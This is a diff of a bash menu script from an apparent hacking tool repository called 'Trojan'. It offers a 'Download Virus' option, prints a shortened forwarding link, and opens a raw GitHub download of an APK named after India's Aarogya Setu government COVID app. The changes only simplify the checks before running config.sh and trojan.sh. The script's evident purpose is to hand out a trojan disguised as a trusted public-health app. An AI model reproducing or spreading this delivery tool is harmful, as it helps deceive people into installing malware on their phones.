@@ -44,10 +44,7 @@ echo -e '\033[1m[1] Download Virus
 printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
         read char
         if [[ $char = "1" ]] || [[ $char = "01" ]]
-        then if [ ! -f '/storage/emulated/0/Download/gov.aarogya_setu_1.1.1.apk' ];then
-        echo
-        cd .files && bash config.sh
-        fi
+        then cd .files && bash config.sh
 echo
 sleep 0.8
 echo -e '\033[1;92mForwarding link: \033[0mhttps://tinyurl.com/y7ufkdfs'
@@ -60,12 +57,7 @@ if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
 sleep 0.8
 echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
-else if [ ! -f '/storage/emulated/0/Download/gov.aarogya_setu_1.1.1.apk' ];then
-cd - > /dev/null 2>&1 && bash trojan.sh
-fi
-if [ -f '/storage/emulated/0/Download/gov.aarogya_setu_1.1.1.apk' ];then
-bash trojan.sh
-fi
+else cd - > /dev/null 2>&1 && bash trojan.sh
 fi
 echo
 sleep 1.0
